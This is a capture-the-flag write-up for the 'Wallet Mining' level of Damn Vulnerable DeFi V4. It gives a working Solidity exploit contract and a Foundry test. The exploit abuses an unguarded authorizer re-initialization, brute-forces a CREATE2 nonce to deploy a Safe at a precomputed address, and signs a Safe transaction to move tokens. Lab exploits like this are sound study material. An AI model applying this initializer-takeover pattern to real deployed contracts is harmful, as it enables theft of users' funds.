# Wallet Mining

There’s a contract that incentivizes users to deploy Safe wallets, rewarding them with 1 DVT. It integrates with an upgradeable authorization mechanism, only allowing certain deployers (a.k.a. wards) to be paid for specific deployments.

The deployer contract only works with a Safe factory and copy set during deployment. It looks like the [Safe singleton factory](https://github.com/safe-global/safe-singleton-factory) is already deployed.

The team transferred 20 million DVT tokens to a user at `0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496`, where her plain 1-of-1 Safe was supposed to land. But they lost the nonce they should use for deployment.

To make matters worse, there's been rumours of a vulnerability in the system. The team's freaked out. Nobody knows what to do, let alone the user. She granted you access to her private key.

You must save all funds before it's too late!

Recover all tokens from the wallet deployer contract and send them to the corresponding ward. Also save and return all user's funds.

In a single transaction.


# Challenge Overview



**[original site](https://www.damnvulnerabledefi.xyz/challenges/wallet-mining)**  


I am trying to reduce fluffs and indirect stuffs as much as posible


## Let’s dive

The **[Wallet Mining](https://www.damnvulnerabledefi.xyz/challenges/wallet-mining)** challenge is the thirteenth level in the **Damn Vulnerable DeFi V4** series. The goal is simple: Drain all the funds 

> Note: It is kinda one of the hardest level in DamnVulnerableDefi series. It will be better if you have knowledge in `CREATE`, `CREATE2` and `EIP-155`

## POC:
```solidity
contract Exploit {
    constructor (
        DamnValuableToken token, // The DVT token contract used for transferring tokens.
        AuthorizerUpgradeable authorizer, // The authorizer contract that allows initialization and authorization.
        WalletDeployer walletDeployer, // The wallet deployer contract for deploying a new Safe wallet.
        address safe, // The address of the Safe wallet.
        address ward, // The ward address that will receive funds (1 DVT token).
        bytes memory initializer, // The initializer data for setting up the Safe wallet during deployment.
        uint256 saltNonce, // The nonce used with CREATE2 to deploy the wallet.
        bytes memory txData // The transaction data that will be called on the Safe wallet after deployment.
    ) {
        // Create an array of one element for 'wards', which is this contract.
        address[] memory wards = new address[](1);
        address[] memory aims = new address[](1);

        // Set the 'ward' to this contract and the 'aim' to the Safe wallet address.
        wards[0] = address(this);
        aims[0] = safe;

        // Call the 'init' function on the Authorizer contract to set this contract as an authorized address.
        authorizer.init(wards, aims); // This authorizes this contract to interact with the Safe wallet.

        // Deploy the Safe wallet via the WalletDeployer contract using the CREATE2 opcode with the provided initializer data and nonce.
        bool success = walletDeployer.drop(address(safe), initializer, saltNonce);
        require(success, "deploy failed"); // Ensure the deployment was successful.

        // Transfer the balance of this contract (if any) to the ward address.
        token.transfer(ward, token.balanceOf(address(this))); // Transfers tokens to the ward address.

        // Execute the transaction on the Safe wallet, calling it with the provided transaction data.
        (success,) = safe.call(txData);
        require(success, "tx failed"); // Ensure the transaction was successful.
    }
}
```

Now, you just need to write given in test function 
```solidity
function test_walletMining() public checkSolvedByPlayer {
        // Step 1: Find the correct nonce using a loop to compute the expected address with CREATE2
        address[] memory _owners = new address[](1);
        _owners[0] = user;
        bytes memory initializer =
            abi.encodeCall(Safe.setup, (_owners, 1, address(0), "", address(0), address(0), 0, payable(0)));

        uint256 nonce;

        bool flag = false;
        while (!flag) {
            address target = vm.computeCreate2Address(
                keccak256(abi.encodePacked(keccak256(initializer), nonce)),
                keccak256(abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(address(singletonCopy))))),
                address(proxyFactory)
            );
            if (target == USER_DEPOSIT_ADDRESS) {
                flag = true;
                break;
            }
            nonce ++;
        }
        // Step 2: Prepare execTransaction call data
        bytes memory execData;
        { // avoid stack too deep   
            address to = address(token);
            uint256 value = 0;
            bytes memory data = abi.encodeWithSelector(token.transfer.selector, user, DEPOSIT_TOKEN_AMOUNT);
            Enum.Operation operation = Enum.Operation.Call;
            uint256 safeTxGas = 100000;
            uint256 baseGas = 100000;
            uint256 gasPrice = 0;
            address gasToken = address(0);
            address refundReceiver = address(0);
            uint256 nonce = 0;
            bytes memory signatures;

            // Step 3: Calculate transaction hash manually since Safe is not yet deployed
            // We cannot call `safe.getTransactionHash` because the Safe contract has not been deployed yet
            // We also can't use `singletonCopy.getTransactionHash` because the domainSeparator depends on the Safe address
            { // avoid stack too deep   
                bytes32 safeTxHash = keccak256(
                    abi.encode(
                        0xbb8310d486368db6bd6f849402fdd73ad53d316b5a4b2644ad6efe0f941286d8, // SAFE_TX_TYPEHASH,
                        to,
                        value,
                        keccak256(data),
                        operation,
                        safeTxGas,
                        baseGas,
                        gasPrice,
                        gasToken,
                        refundReceiver,
                        nonce
                    )
                );
                bytes32 domainSeparator = keccak256(abi.encode(
                    0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218, // DOMAIN_SEPARATOR_TYPEHASH,
                    singletonCopy.getChainId(),
                    USER_DEPOSIT_ADDRESS
                ));
                // Step 4: Sign the transaction hash using the user's private key
                bytes32 txHash = keccak256(abi.encodePacked(bytes1(0x19), bytes1(0x01), domainSeparator, safeTxHash));
                (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, txHash);
                signatures = abi.encodePacked(r, s, v);
            }
            //Step 5: Encode the execTransaction call data for later execution
            execData = abi.encodeWithSelector(singletonCopy.execTransaction.selector, to, value, data, operation, safeTxGas, baseGas, gasPrice, gasToken, refundReceiver, signatures);
        }
        // Step 6: Deploy the Safe and execute the exploit
         new Exploit(token, authorizer, walletDeployer, USER_DEPOSIT_ADDRESS, ward, initializer, nonce, execData);
 
    }
 ```

>Okay! This Much 

### If you found this write up useful give a star to the **[repo](https://github.com/0xscarfac3/damnvulnerabledefi-v4-solutions)** and don't forget to follow your buddy **[0xscarfac3](https://github.com/0xscarfac3)**
